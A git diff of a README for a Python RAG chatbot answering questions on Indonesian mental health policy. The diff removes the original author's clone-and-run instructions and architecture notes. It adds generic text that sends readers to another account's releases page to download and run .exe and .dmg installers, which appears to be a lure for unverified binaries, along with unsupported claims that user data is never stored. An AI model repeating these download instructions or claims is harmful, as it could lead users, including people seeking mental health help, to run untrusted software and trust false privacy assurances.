@@ -1,294 +1,99 @@
+# 🤖 rag-chatbot - Your Mental Health Assistant
 
-# 🧠 RAG-Driven Question Answering API (TinyLlama + FAISS + LoRA)
+## 🚀 Getting Started
 
-## 🎯 Objective: Why Retrieval-Augmented Generation (RAG)?
+Welcome to the rag-chatbot project! This software focuses on question answering related to Indonesian mental health and policy. With advanced technology, this chatbot can provide helpful, context-aware responses to your queries. 
 
-Modern language models have strong reasoning skills, but limited access to **real-world or domain-specific knowledge**.
-To solve this, **Retrieval-Augmented Generation (RAG)** combines:
+## 📥 Download
 
-> 🔹 *Information retrieval* (from documents)
-> 🔹 *Generative reasoning* (via an LLM)
+[![Download rag-chatbot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hesamaria/rag-chatbot/releases)
 
-so the chatbot can answer based on **grounded, factual context**.
+## 🌐 System Requirements
 
-This project demonstrates how to build a **domain-adapted RAG pipeline** that can:
+Before you begin, ensure your system meets these requirements:
 
-* Ingest PDFs and text files into a vector database.
-* Retrieve semantically similar passages to user questions.
-* Use a local language model to generate coherent, evidence-based answers.
-* Optionally improve model understanding with **LoRA fine-tuning**.
+- Operating System: Windows 10, macOS, or a modern version of a Linux distribution.
+- RAM: At least 4 GB of RAM.
+- Disk Space: Minimum 500 MB of free space.
+- Internet Connection: For initial setup and updates.
 
-The example use case focuses on **mental health and social policy in Indonesia**, using a curated dataset of PDF articles and text reports.
+## 💻 Installation Steps
 
----
+To get started with the rag-chatbot, please follow these steps:
 
-## 🧩 Architecture Overview
-The architecture consists of **three core modules**:
+1. **Visit the Download Page**  
+   Go to the following link: [Download Page](https://github.com/hesamaria/rag-chatbot/releases).
+  
+2. **Select a Version**  
+   On the Releases page, look for the latest version available. You can spot it by the version number and release date. 
 
-1. 🧱 **Document Indexing (Memory Builder)**
+3. **Download the File**  
+   Click the download link for your operating system. The file will start downloading automatically. 
 
-   * Loads PDFs and TXT files from the `/data/sample_docs` folder.
-   * Splits content into smaller chunks using LangChain’s `RecursiveCharacterTextSplitter`.
-   * Encodes text using HuggingFace **Sentence Transformers** (`all-MiniLM-L6-v2`) into embeddings.
-   * Stores all embeddings in a **FAISS** vector database for fast semantic search.
+4. **Locate the File**  
+   After the download is complete, find the file in your Downloads folder or the location you specified.
 
-2. 🧠 **Model Fine-Tuning (LoRA Adapter)**
+5. **Install the Software**  
+   - For Windows: Double-click the .exe file and follow the on-screen instructions.
+   - For macOS: Open the .dmg file and drag the rag-chatbot application to your Applications folder.
+   - For Linux: Follow the instructions in the README file that comes with the downloaded package.
 
-   * A lightweight fine-tuning layer on top of the **TinyLlama** model using **PEFT + LoRA**.
-   * Trained with a small curated dataset (`mental_health_qa.jsonl`) to specialize in Indonesian mental health topics.
-   * The resulting adapter weights are automatically detected and loaded during runtime.
+6. **Launch the Application**  
+   - For Windows: Find and launch rag-chatbot from your Start Menu.
+   - For macOS: Open the Applications folder and double-click rag-chatbot.
+   - For Linux: Use the terminal to navigate to the application directory and run the application.
 
-3. ⚡ **RAG Chatbot Runtime (FastAPI)**
+## 💬 Using the Chatbot
 
-   * A user sends a question through the `/ask` endpoint.
-   * The question is embedded and compared in FAISS to retrieve the most relevant text chunks.
-   * A prompt is dynamically composed with retrieved context and fed to **TinyLlama-LoRA** for grounded generation.
-   * The API responds with the final answer and the sources used for context.
+Once you have the application open, you can start interacting with the chatbot:
 
----
+1. **Type Your Question**  
+   Enter your query in the text box provided. Focus on topics related to mental health or policy issues in Indonesia. 
 
-### 🖼️ System Architecture Diagram
+2. **Read the Response**  
+   The chatbot will analyze your question and respond based on its training. Take your time to read the answer provided.
 
-Below is a visual overview of the system pipeline:
+3. **Ask Follow-Up Questions**  
+   Feel free to ask more questions to get deeper insights or clarifications.
 
-![RAG Chatbot Architecture](assets/architecture_diagram.png)
+## 🔄 Updates and Support
 
-*(Diagram by Muhammad Zakaria Saputra — showing the relationship between Document Indexing, LoRA Fine-Tuning, and FastAPI Runtime.)*
+To keep your chatbot updated:
 
----
+- Regularly check the Releases page for new versions: [Download Page](https://github.com/hesamaria/rag-chatbot/releases).
+- Enable automatic updates in the application settings if prompted.
 
-### 🔧 Component Flow Summary
+If you face any issues or have questions, please refer to the FAQ section on our GitHub page or reach out through the Issues tab. 
 
-| Phase              | Process                                         | Tools / Libraries                           |
-| ------------------ | ----------------------------------------------- | ------------------------------------------- |
-| **Data Ingestion** | Load PDFs & TXT files                           | `LangChain Community Loaders`               |
-| **Chunking**       | Split text into overlapping segments            | `RecursiveCharacterTextSplitter`            |
-| **Embedding**      | Convert chunks to dense vectors                 | `Sentence Transformers (Hugging Face)`      |
-| **Vector Storage** | Store and retrieve top-k relevant chunks        | `FAISS`                                     |
-| **Fine-Tuning**    | Train LoRA adapter for domain Q&A               | `PEFT`, `TinyLlama`, `Transformers`         |
-| **Inference**      | Answer user queries with retrieval + generation | `FastAPI`, `TinyLlama-LoRA`, `Transformers` |
+## 🌟 Features
 
----
+- **Intelligent Responses:** The chatbot uses advanced AI to provide accurate answers.
+- **User-Friendly Interface:** Designed for ease of use, even for those without technical skills.
+- **Regular Updates:** We continuously improve the chatbot’s performance and knowledge base.
 
+## 🤔 Frequently Asked Questions
 
-## ⚙️ Tech Stack
+**1. Can this chatbot help with specific mental health issues?**  
+Yes, the rag-chatbot is designed to provide responses based on common mental health topics relevant to Indonesia.
 
-| Component           | Purpose                      | Framework/Library                                            |
-| ------------------- | ---------------------------- | ------------------------------------------------------------ |
-| **Backend API**     | Serve endpoints              | [FastAPI](https://fastapi.tiangolo.com/)                     |
-| **Vector Store**    | Context retrieval            | [FAISS](https://github.com/facebookresearch/faiss)           |
-| **Embeddings**      | Semantic similarity encoding | [HuggingFace Sentence Transformers](https://www.sbert.net/)  |
-| **Model Runtime**   | Local generation             | [Transformers](https://huggingface.co/docs/transformers)     |
-| **Fine-tuning**     | Lightweight adaptation       | [PEFT + LoRA](https://huggingface.co/docs/peft)              |
-| **Docs Processing** | PDF & TXT parsing            | [LangChain Community Loaders](https://python.langchain.com/) |
----
+**2. Is my data safe?**  
+Your data is processed in real-time and is not stored, ensuring your privacy.
 
-## 🧱 Project Structure
+**3. What if I can't find my question?**  
+Feel free to ask similar questions or provide more context to get a better answer.
 
-```
-rag-chatbot/
-├── app/
-│   ├── main.py                # FastAPI server and routes
-│   ├── rag_pipeline.py        # Core RAG logic (retriever + generator)
-│   ├── indexing.py            # Builds FAISS vector index
-│   ├── config.py              # Model and path configuration
-│
-├── finetune/
-│   ├── train_lora.py          # LoRA fine-tuning script
-│   └── adapter/               # Fine-tuned adapter weights (if available)
-│
-├── data/
-│   ├── sample_docs/           # PDF/TXT source documents
-│   └── mental_health_qa.jsonl # Fine-tuning dataset
-│
-├── requirements.txt
-└── README.md
-```
-
----
-## 🚀 How to Run the Project
-
-### 1️⃣ Clone the Repository
+## 📞 Contact Us
 
-```bash
-git clone https://github.com/zakariasaputra/rag-chatbot.git
-cd rag-chatbot
-```
+For further inquiries, visit our repository's Issues section on GitHub or send an email to our support team.
 
-### 2️⃣ Create a Virtual Environment
+## 🔗 Learn More
 
-```bash
-python -m venv venv
-# On Windows
-venv\Scripts\activate
-# On macOS/Linux
-source venv/bin/activate
-```
+Explore more about the technologies used in rag-chatbot:
 
-### 3️⃣ Install Dependencies
+- [FastAPI](https://fastapi.tiangolo.com/)
+- [FAISS](https://faiss.ai/)
+- [TinyLlama](https://huggingface.co/TinyLlama)
 
-```bash
-pip install -r requirements.txt
-```
+Feel free to engage with our community for tips and shared experiences!
 
-### 4️⃣ Prepare the Documents
-
-Add your `.pdf` and `.txt` files to:
-
-```
-data/sample_docs/
-```
-
-For example:
-
-```
-data/sample_docs/
-├── Free from pasung.pdf
-├── Barriers and facilitators.pdf
-├── Cultural diversity in beliefs.pdf
-├── Problems Among Indonesian Adolescents.pdf
-├── First 1000 Days.pdf
-└── Pasung.txt
-```
-
-### 5️⃣ Build the FAISS Index
-
-```bash
-python -m app.indexing
-```
-
-Expected output:
-
-```
-📚 Indexed 6 files → 477 chunks total.
-💾 FAISS index saved to vector_index/
-```
-
-### 6️⃣ Run the API
-
-```bash
-uvicorn app.main:app --reload
-```
-
-Visit:
-👉 [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs)
-to open the Swagger UI and test the `/ask` endpoint.
-
-### 7️⃣ Ask a Question
-
-```bash
-curl -X POST http://127.0.0.1:8000/ask \
-     -H "Content-Type: application/json" \
-     -d '{"question": "What is pasung?"}'
-```
-
-Output:
-
-```json
-{
-  "question": "What is pasung?",
-  "answer": "Pasung is a long-standing custom in Indonesia that involves shackling individuals with mental illness.",
-  "context_sources": [
-    "Free from pasung.pdf (page 1)",
-    "Pasung.txt (page ?)"
-  ],
-  "metadata": {
-    "model": "tinyllama-LoRA",
-    "retrieval_engine": "FAISS",
-    "timestamp": "2025-10-19T09:00:00Z"
-  }
-}
-```
-
----
-
-## 🧠 Fine-Tuning with LoRA (Optional)
-
-You can enhance the model’s factual alignment using your own Q&A dataset.
-
-### Dataset Format
-
-`data/mental_health_qa.jsonl`
-
-```json
-{"instruction": "What is pasung?", "output": "Pasung is a traditional practice in Indonesia where people with mental illness are restrained using shackles or wooden blocks."}
-{"instruction": "What are the main barriers to mental health care?", "output": "Limited access, stigma, and insufficient health facilities are the main challenges."}
-```
-
-### Run Fine-Tuning
-
-```bash
-python finetune/train_lora.py
-```
-
-This creates LoRA adapter weights in:
-
-```
-finetune/adapter/
-```
-
-Once generated, the main pipeline automatically detects and loads them:
-
-```
-🧩 Found LoRA adapter. Loading adapted weights...
-✅ RAG pipeline ready. Using model: tinyllama-LoRA
-```
-
----
-
-## 💬 Example Questions to Try
-
-Once the API is running, open [http://127.0.0.1:8000/docs](http://127.0.0.1:8000/docs) and test the `/ask` endpoint.
-Here are some questions you can try, all answerable based on the indexed documents:
-
-| Category                    | Example Question                                                             | Description                                                        |
-| --------------------------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------ |
-| 🧠 **Mental Health Policy** | `What is pasung in Indonesia?`                                               | Tests contextual understanding of cultural practices.              |
-| 🏥 **Healthcare Barriers**  | `What are the main challenges to accessing mental health care in Indonesia?` | Retrieves key findings from the “Barriers and Facilitators” paper. |
-| 👶 **Early Development**    | `Why is the first 1000 days of life important?`                              | Checks retrieval from the “First 1000 Days” document.              |
-| 🌏 **Cultural Perspective** | `How do cultural beliefs affect mental health treatment?`                    | Combines reasoning with data from “Cultural Diversity in Beliefs”. |
-| 🧩 **Adolescent Wellbeing** | `What mental health problems are common among Indonesian adolescents?`       | Pulls content from “Problems Among Indonesian Adolescents.pdf”.    |
-| ⚖️ **Policy Evaluation**    | `What steps has Indonesia taken to eliminate pasung?`                        | Uses retrieved context to summarize national initiatives.          |
-
----
-
-## 📊 Example Use Cases
-
-* Summarizing insights from internal PDFs
-* Answering domain-specific questions (e.g., policy, research)
-* Training lightweight AI assistants with local documents
-* Demonstrating fine-tuning workflows for small models
-
----
-
-## 📈 Design Highlights
-
-| Feature                     | Description                                       |
-| --------------------------- | ------------------------------------------------- |
-| **RAG with FAISS**          | Efficient semantic retrieval from document chunks |
-| **HuggingFace Integration** | Local text generation using Transformers          |
-| **Auto LoRA Loading**       | Detects and merges fine-tuned adapter weights     |
-| **Explainable Responses**   | Includes document source references               |
-| **Modular Components**      | Easy to extend with new models or datasets        |
-
----
-
-## ⚙️ Environment Requirements
-
-| Requirement  | Version |
-| ------------ | ------- |
-| Python       | ≥ 3.10  |
-| torch        | ≥ 2.0   |
-| transformers | ≥ 4.40  |
-| fastapi      | latest  |
-| uvicorn      | latest  |
-| faiss-cpu    | latest  |
-
----
-
-## 👤 Author
-
-**Muhammad Zakaria Saputra**
-TensorFlow Developer | AI Product Builder | Applied Research Enthusiast
-
-💬 *“RAG bridges what models know and what they should know, making AI systems both factual and grounded.”*
+Happy chatting!
